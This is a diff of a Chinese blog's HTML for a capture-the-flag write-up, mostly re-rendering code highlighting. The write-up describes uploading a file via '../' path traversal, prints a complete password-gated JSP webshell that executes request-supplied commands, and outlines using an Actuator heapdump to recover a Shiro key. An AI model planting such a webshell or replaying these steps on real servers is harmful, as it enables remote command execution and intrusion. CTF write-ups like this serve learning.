@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      296 字
+      300 字
     </span>
   
 
@@ -260,17 +260,17 @@
 <p>上传<code>.jsp</code>马，但上传的文件目录<code>jsp</code>文件不能访问，所以要上传到上一级目录，修改<code>aaaa.jsp</code>为<code>../a.jsp</code></p>
 <p>在<code>burp-&gt;hex</code>里或者winhex,010editor里应该都行，但我一个都没成功。。。。。。。。。。。。。。。。</p>
 <p>网上的jsp马</p>
-<pre><code class="hljs jsp">&lt;%
-<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;023&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pwd&quot;</span>)))&#123;
-java.io.InputStream in =
-Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;i&quot;</span>)).getInputStream();
-<span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;
-<span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];
-out.print(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);
-<span class="hljs-keyword">while</span>((a=in.read(b))!=-<span class="hljs-number">1</span>)&#123;
-out.println(<span class="hljs-keyword">new</span> String(b));
+<pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%
+if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;
+java.io.InputStream in &#x3D;
+Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
+int a &#x3D; -1;
+byte[] b &#x3D; new byte[2048];
+out.print(&quot;&lt;pre&gt;&quot;);
+while((a&#x3D;in.read(b))!&#x3D;-1)&#123;
+out.println(new String(b));
 &#125;
-out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);
+out.print(&quot;&lt;&#x2F;pre&gt;&quot;);
 &#125;
 %&gt;</code></pre>
 
@@ -280,12 +280,12 @@ out.print(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);
 <p><code>heapdump</code>放到<code>visualVM</code>分析<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html">Actuator 未授权访问之heapdump利用 </a></p>
 <p><code>查找Shiro CipherKey</code><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122332753.png" srcset="/img/loading.gif"></p>
 <p>脚本对byte转换为base64编码的key</p>
-<pre><code class="hljs python"><span class="hljs-keyword">import</span> base64
-<span class="hljs-keyword">import</span> struct
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+<span class="token keyword">import</span> struct
 
-a=base64.b64encode(struct.pack(<span class="hljs-string">&#x27;&lt;bbbbbbbbbbbbbbbb&#x27;</span>,<span class="hljs-number">-19</span>,<span class="hljs-number">33</span>, <span class="hljs-number">35</span>, <span class="hljs-number">114</span>, <span class="hljs-number">-3</span>, <span class="hljs-number">79</span>, <span class="hljs-number">86</span>, <span class="hljs-number">4</span>, <span class="hljs-number">108</span>, <span class="hljs-number">-45</span>,
-<span class="hljs-number">69</span>, <span class="hljs-number">-107</span>, <span class="hljs-number">-38</span>, <span class="hljs-number">-72</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-23</span>))
-print(a)</code></pre>
+a<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;bbbbbbbbbbbbbbbb'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">45</span><span class="token punctuation">,</span>
+<span class="token number">69</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
 <p>shiro利用工具</p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202112122333889.png" srcset="/img/loading.gif"></p>
 <p><code>cat /flag</code></p>
